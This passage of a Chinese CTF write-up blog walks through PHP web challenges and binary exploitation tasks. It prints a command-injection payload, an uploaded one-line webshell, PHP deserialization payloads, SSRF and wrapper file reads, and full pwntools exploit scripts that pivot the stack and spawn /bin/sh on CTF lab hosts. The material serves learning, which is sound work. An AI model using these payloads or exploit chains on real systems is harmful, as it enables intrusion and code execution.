1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e5459932745177090343288558410202406107080e462097431906509019562988736854314282422 这种办法当遇到’&#x3D;&#x3D;&#x3D;’就会失效 2.md5不能加密数组，md5加密数组会返回null (5条消息) PHP弱类型_ChanCherry、的博客-CSDN博客_php弱类型 caidao打开后 直接就显示出来了一句话木马 知道了密码以后就可以用蚁剑连接终端 然后在根目录下获得flag easyrce123&lt;?php ?&gt; 随后我们利用burp来抓包 修改文件后缀名为php 随后结束抓包 我们利用蚁剑连接后台 12http://1.14.71.254:28963/upload/1.php //这里的后缀名比较讲究 但是发现这是个静态flag 很显然是错误的 因为通常的靶机都是使用uuid进行动态flag的生成 所以这里我们要想到去查看环境变量中的flag 即phpinfo() 123payload = http://1.14.71.254:28963/upload/1.phppost: shell=phpinfo(); 成功找到flag Do_you_know_http打开靶机后 网页显示: Please use ‘WLLM’ browser! 让我们使用WLLM这个浏览器 很明显没有这个浏览器 那我们可以通过burp修改User-Agent这一项参数 其是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。 当我们修改完后send 提示说success说明修改成功 然后在location下我们发现了一个新的页面 a.php 跟进一下 提示说需要我们用本地的ip访问 即127.0.0.1 于是我们在request中添加一段 12x-forwarded-for:127.0.0.1 可以发现成功了 在location出现了一个新的php 访问后发现flag babyrce1234567891011 &lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);if($_COOKIE[&#x27;admin&#x27;]==1) &#123; include &quot;../next.php&quot;;&#125;else echo &quot;小饼干最好吃啦！&quot;;?&gt; 小饼干最好吃啦！ 用burp来使admin&#x3D;1 得到了一个关键网页 rasalghul.php 跟进一下看看 12345678910111213 &lt;?phperror_reporting(0);highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;url&#x27;])) &#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&#x27;nonono&#x27;); &#125; $a = shell_exec($ip); echo $a;&#125;?&gt; 屏蔽了空格 用get给url传参 这个参数会被执行 那这里就用$IFS$1替代空格就好了 1payload = url=cat$IFS$1/f* no_wakeup123456789101112131415161718192021222324252627282930313233343536 &lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __wakeup()&#123; $this-&gt;passwd = sha1($this-&gt;passwd); &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;passwd; echo &quot;No wake up&quot;; &#125; &#125; &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt; 调用了_wakeup函数 是cve漏洞CVE-2016-7124 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行 编写一下序列化脚本： 12345678&lt;?phpclass HaHaHa&#123; public $admin=&#x27;admin&#x27;; public $passwd=&#x27;wllm&#x27;;&#125;$p = new HaHaHa();echo serialize($p);?&gt; 1O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; 将a后面的2修改成大于其值的数 1O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; 成功得到flag ez_unserialize12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;ez_unserialize&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;./hutao.GIF&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;咦？题目在哪捏？&lt;/h3&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--User-agent: *Disallow: 什么东西呢？--&gt; 主体部分没有什么值得关注的 这里看一下注释部分 user_agent:和disallow 是robots协议的特征 https://blog.csdn.net/qq_53221728/article/details/122909592 查看一下robots.txt 12User-agent: *Disallow: /cl45s.php 发现了一个新的网页 跟进一下 12345678910111213141516171819202122232425262728293031 &lt;?phperror_reporting(0);show_source(&quot;cl45s.php&quot;);class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125;&#125;$p = $_GET[&#x27;p&#x27;];unserialize($p);?&gt; 跟上题一样 也是反序列化漏洞 百度一下__construct有什么漏洞可以利用 (5条消息) php反序列化construct绕过,PHP反序列化漏洞_weixin_39824801的博客-CSDN博客 (5条消息) php反序列化construct绕过,PHP反序列化漏洞（1）_weixin_39730801的博客-CSDN博客 可知__construct函数是对象创建时调用 那么我们正常序列化admin和passwd就行 12345678&lt;?phpclass wllm&#123; public $admin=&#x27;admin&#x27;; public $passwd=&#x27;ctf&#x27;;&#125;$p = new wllm();echo serialize($p);?&gt; 1O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; 成功得到flag easyupload2.0和1.0那一题大差不差 这题把php文件后缀做了检测 禁止上传php文件 但是发现php文件扩展名还是可以上传成功的 1php3，php5，pht，phtml，phps PseudoProtocols题目初始界面 1hint is hear Can you find out the hint.php? 然后看到url是 1http://1.14.71.254:28411/index.php?wllm= 还不知道wllm有什么用 先进去hint.php看一看提示 结果为空 结合题目描述 应该是file伪协议 1wllm=php://filter/convert.base64-encode/resource=hint.php 得到一串base64编码 解码后得到 123&lt;?php//go to /test2222222222222.php?&gt; 跟进一下这个页面 12345678910 &lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123; echo &quot;success\\n&quot;; echo $flag;&#125;?&gt; file_get_contents这个函数是把文件r读入字符串 这里有两种办法 1.php:&#x2F;&#x2F;input https://blog.csdn.net/sunsineq/article/details/105371129 他相当于强行以post的办法读入任意内容到a中 2.data:&#x2F;&#x2F; data本身是数据封装器 以get的方式传参 1http://1.14.71.254:28411/test2222222222222.php?a=data://text/plain,I want flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[]},{"title":"Black Watch 入群题","slug":"Black-Watch-入群题","date":"2022-11-18T14:45:27.000Z","updated":"2022-11-18T14:53:04.592Z","comments":true,"path":"2022/11/18/Black-Watch-入群题/","link":"","permalink":"http://example.com/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/","excerpt":"","text":"做的时候发现忘记了好多知识点 复现一下 不然本来这题的知识点以前的博客都有讲到 123456[*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开金丝雀和pie 32位 ida看看 12345678910111213ssize_t vul_function()&#123; size_t v0; // eax size_t v1; // eax char buf[24]; // [esp+0h] [ebp-18h] BYREF v0 = strlen(m1); write(1, m1, v0); read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); return read(0, buf, 0x20u);&#125; 关键函数 给了两次溢出的机会 第二次只能溢出两个字长 看到这里就应该反应过来是栈迁移 第一个read写入的地址是bss段 这里我一开始想的是写入shellcode 打不通后仔细想了想 重新学习了NX保护 NX保护简单理解就是使内存页的数据不可执行 那为什么我们可以构造rop链呢 因为rop链的执行流控制是利用栈帧的ret指令来实现的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload) 说一下思路吧 第一个read构造write泄露基址 然后要返回main函数 进行下一次的system系统调用 然后栈迁移到对应的地址-4 这里的-4前面的专门讲解栈迁移的篇幅有提到 接下来就是构造system的链 然后执行了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"FlareOn4_login","slug":"FlareOn4-login","date":"2022-11-18T03:40:42.000Z","updated":"2022-11-18T03:52:46.864Z","comments":true,"path":"2022/11/18/FlareOn4-login/","link":"","permalink":"http://example.com/2022/11/18/FlareOn4-login/","excerpt":"","text":"题目的形式很新颖 没遇到过 就记录下来 打开后的附件是一个网站 要求我们输入flag 然后点击按钮进行判断 查看一下网页的源代码 123456789101112131415161718192021&lt;!DOCTYPE Html /&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;FLARE On 2017&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;flag&quot; id=&quot;flag&quot; value=&quot;Enter the flag&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;prompt&quot; value=&quot;Click to check the flag&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&quot;prompt&quot;).onclick = function () &#123; var flag = document.getElementById(&quot;flag&quot;).value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;); if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123; alert(&quot;Correct flag!&quot;); &#125; else &#123; alert(&quot;Incorrect flag, rot again&quot;); &#125; &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 123return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122)判断读入的字符大小写情况 并返回ascii码值并且为下面的判断规定了范围 1234(c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;将当前字符的ascii码值加13后进行一个判断 如果大于Z或者z 则-26如果没有大于就返回加13后的值也就是常规的凯撒密码 偏移量是13 找到下方的密文 进行凯撒变化后 得到flag &#67;&#x6c;&#105;&#x65;&#110;&#x74;&#83;&#105;&#x64;&#101;&#x4c;&#111;&#103;&#x69;&#x6e;&#x73;&#65;&#114;&#x65;&#x45;&#x61;&#115;&#x79;&#x40;&#102;&#x6c;&#x61;&#x72;&#x65;&#x2d;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#x6d;","categories":[{"name":"reverse","slug":"reverse","permalink":"http://example.com/categories/reverse/"}],"tags":[]},{"title":"NISACTF 2022","slug":"NISACTF-2022","date":"2022-11-17T03:14:57.000Z","updated":"2022-11-17T05:13:23.230Z","comments":true,"path":"2022/11/17/NISACTF-2022/","link":"","permalink":"http://example.com/2022/11/17/NISACTF-2022/","excerpt":"","text":"easyssrf题目提示说是ssrf https://xz.aliyun.com/t/2115 这里猜测是利用file协议来打开相应的文件 1payload = file:///flag 返回:都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g 1payload = file:///fl4g 返回: file:&#x2F;&#x2F;&#x2F;fl4g 的快照如下：你应该看看除了index.php，是不是还有个ha1x1ux1u.php 跟进一下 发现了源代码 123456789101112 &lt;?phphighlight_file(__FILE__);error_reporting(0);$file = $_GET[&quot;file&quot;];if (stristr($file, &quot;file&quot;))&#123; die(&quot;你败了.&quot;);&#125;//flag in /flagecho file_get_contents($file); stristr屏蔽了file协议 那试一下目录穿越 1payload = ?file=../../../../../../flag 成功获得flag checkin123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;// ‮⁦NISACTF⁩⁦Welcome toif (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b echo $FLAG;&#125;show_source(__FILE__);?&gt; 一开始看到以为是最简单的get传参 但是试了一下发现不行 网上查询wp后发现 猫腻在于php的高亮显示规定 这段源码有不可见字符在作祟 我们选中NISA会发现Welcome也被选中了 我们将源码复制进文本文件 然后用010打开 这样可以显示不可见字符的16进制 ps:这里我遇到了一个问题 用火狐浏览器复制源码最后和用edge浏览器复制的源码不一样 火狐的源码是错误的 暂时不知道解决原因 可以看出第一个参数ahahahaha并没有被动手脚 后方的参数有问题 选中-&gt;编辑-&gt;复制为-&gt;16进制文本 1E2 80 AE E2 81 A6 55 67 65 69 77 6F E2 81 A9 E2 81 A6 63 75 69 73 68 69 79 75 61 6E //参数名 1%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E //将空格转成% 1E2 80 AE E2 81 A6 20 46 6C 61 67 21 E2 81 A9 E2 81 A6 4E 31 53 41 43 54 46 //参数 1%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46 //同上 1payload = ?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[]},{"title":"ACTF新生赛2020_easyre","slug":"ACTF新生赛2020-easyre","date":"2022-11-16T11:12:28.000Z","updated":"2022-11-16T11:18:34.905Z","comments":true,"path":"2022/11/16/ACTF新生赛2020-easyre/","link":"","permalink":"http://example.com/2022/11/16/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/","excerpt":"","text":"upx加壳 32位 脱壳完后代码 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; _BYTE v4[12]; // [esp+12h] [ebp-2Eh] BYREF _DWORD v5[3]; // [esp+1Eh] [ebp-22h] _BYTE v6[5]; // [esp+2Ah] [ebp-16h] BYREF int v7; // [esp+2Fh] [ebp-11h] int v8; // [esp+33h] [ebp-Dh] int v9; // [esp+37h] [ebp-9h] char v10; // [esp+3Bh] [ebp-5h] int i; // [esp+3Ch] [ebp-4h] __main(); qmemcpy(v4, &quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;, sizeof(v4)); printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, v6); if ( v6[0] != &#x27;A&#x27; || v6[1] != 67 || v6[2] != 84 || v6[3] != 70 || v6[4] != 123 || v10 != 125 ) return 0; v5[0] = v7; v5[1] = v8; v5[2] = v9; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( v4[i] != _data_start__[*(v5 + i) - 1] ) return 0; &#125; printf(&quot;You are correct!&quot;); return 0;&#125; 注意一下数组的一个元素是四个字节 所以v5存储的是用户输入的12个字节 data_start_[*(v5 + i) - 1] 即用户输入的字符转化为ascii码后再-1 这个值为n v4等于 &#x3D; _data_start[n] 所以逆向程序可以写成 123456a = [42,70,39,34,78,44,34,40,73,63,43,64]b = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\\&quot;&quot;flag = &quot;&quot;for i in a: flag = chr(b.find(chr(i))+1) print(flag,end=&quot;&quot;)","categories":[{"name":"reverse","slug":"reverse","permalink":"http://example.com/categories/reverse/"}],"tags":[]},{"title":"ciscn_2019_s_3","slug":"ciscn-2019-s-3","date":"2022-11-14T11:38:19.000Z","updated":"2022-11-14T12:19:42.082Z","comments":true,"path":"2022/11/14/ciscn-2019-s-3/","link":"","permalink":"http://example.com/2022/11/14/ciscn-2019-s-3/","excerpt":"","text":"12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 主体函数非常简单 利用系统调用号实现了一次输入和输出 12345678signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; 还有一个gadget函数 看一下汇编代码 1234567891011121314151617.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 retn.text:00000000004004E9 ; --------------------------------------------------------------------------- 下方的0x3b则为59 是execve的系统调用号 应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址 所以只能通过写入栈上 要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10 还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流 1234567891011121314151617.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; &#x27;0&#x27; ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write.text:0000000000400519 retn.text:0000000000400519 vuln endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; --------------------------------------------------------------------------- 1234567891011121314from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr)) 可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移 这里的原因暂时没有办法得知 先放着这个疑问 下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu 具体的流程我就不过多赘述了 123456789101112131415161718rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload) 这里重点解释一下三个方面 1.为什么要多出一个p64(int59_addr)在栈上 这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的 2.binsh_addr和stack_addr的偏移是怎么求出来的 我们将断点打在csu执行到call r12那一行 然后gdb看一下栈 可以计算出偏移为0x138 还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向 如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容 1set $rsp = $rsp-0x150 看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧 最终exp: 12345678910111213141516171819202122232425262728293031from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2022-11-14T01:24:11.000Z","updated":"2022-11-14T01:50:44.850Z","comments":true,"path":"2022/11/14/babyheap-0ctf-2017/","link":"","permalink":"http://example.com/2022/11/14/babyheap-0ctf-2017/","excerpt":"","text":"查看一下保护机制 12345Arch: amd64-64-littleRELRO: Full RELROstack: Canary foundNX: NX enabledPIE: PIE enabled FULL RELRO要注意一下 ida反编译一下 1234567891011121314151617181920212223242526272829__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(a1, a2, a3); while ( 1 ) &#123; menu(); switch ( choice() ) &#123; case 1LL: add(v4); break; case 2LL: edit(v4); break; case 3LL: delete(v4); break; case 4LL: print(v4); break; case 5LL: return 0LL; default: continue; &#125; &#125;&#125; 需要留意的是释放堆块的时候 指针也置零了 没有办法uaf 但是edit可以进行堆溢出 题目docker环境为16.04 那么显而易见 有输出函数以及堆溢出的机会 这里用到unsortedbin泄露基址 123456789101112131415161718192021222324252627282930313233343536#前置exp:from pwn import*context.log_level = &quot;debug&quot;#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size:&quot;) io.sendline(str(size)) io.recv()def edit(index,size,payload): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content:&quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) 先申请一个chunk0 用于堆溢出覆盖chunk1的size域 从而使chunk1和chunk2合并 123456add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3 #chunk3的作用则是防止堆块释放后和top chunk合并payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload) gdb看一下此时堆块结构 可以看到已经成功合并了chunk1和chunk2 此时我们free掉chunk1 该合并堆块就会进入到unsortedbin 此时其fd和bk就指向了main_arena+88 我们如果再申请一个0x68大小的chunk 此时bin将会把前半部分的堆块分配出来 于是fd和bk的内容我们就可以通过print新申请的堆块打印出来 1234add(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)) 还差一点 要如果才能确定偏移 从而计算出libc基址 这里我们进行gdb动调 我们需要求出main_arena+88和libc基址的偏移 则可求得 偏移 &#x3D; 0x7f35f3b9bb78-0x7f35f37d7000 由于开启了FULL RELRO 